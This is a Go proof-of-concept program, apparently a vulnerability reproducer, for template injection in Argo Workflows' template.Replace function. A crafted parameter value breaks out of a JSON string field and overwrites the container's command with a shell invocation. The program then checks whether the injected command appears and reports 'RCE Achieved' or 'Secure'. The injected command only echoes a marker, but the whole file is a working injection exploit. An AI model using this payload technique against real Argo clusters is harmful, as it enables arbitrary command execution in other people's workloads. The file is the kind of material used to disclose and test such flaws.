package main

import (
	"encoding/json"
	"fmt"
	"os"
	"reflect"
	"strings"

	"github.com/argoproj/argo-workflows/v3/util/template"
)

func main() {
	// Target
	targetTemplate := `{
		"name": "victim-container",
		"image": "debian:latest",
		"command": ["echo", "safe_command"],
		"env": [
			{
				"name": "USER_INPUT",
				"value": "{{=x}}"
			}
		]
	}`

	// Payload
	exploitPayload := `"}], "command": ["/bin/sh", "-c", "echo YOU_ARE_HACKED"], "ignored": [{"val": "`

	// Attack
	params := map[string]string{
		"x": exploitPayload,
	}

	injectedJson, err := template.Replace(targetTemplate, params, true)
	if err != nil {
		return
	}

	// Verify
	var result map[string]interface{}

	if err := json.Unmarshal([]byte(injectedJson), &result); err != nil {
		return
	}

	cmdInterface, _ := result["command"]

	cmdList := reflect.ValueOf(cmdInterface)
	isPwned := false
	if cmdList.Kind() == reflect.Slice {
		for i := 0; i < cmdList.Len(); i++ {
			arg := fmt.Sprintf("%v", cmdList.Index(i).Interface())
			if strings.Contains(arg, "YOU_ARE_HACKED") {
				isPwned = true
				break
			}
		}
	}

	if isPwned {
		fmt.Println("\n[!] VULNERABILITY REPRODUCED: RCE Achieved!")
		os.Exit(1)
	} else {
		fmt.Println("\n[+] Secure: The command was NOT overwritten.")
		os.Exit(0)
	}
}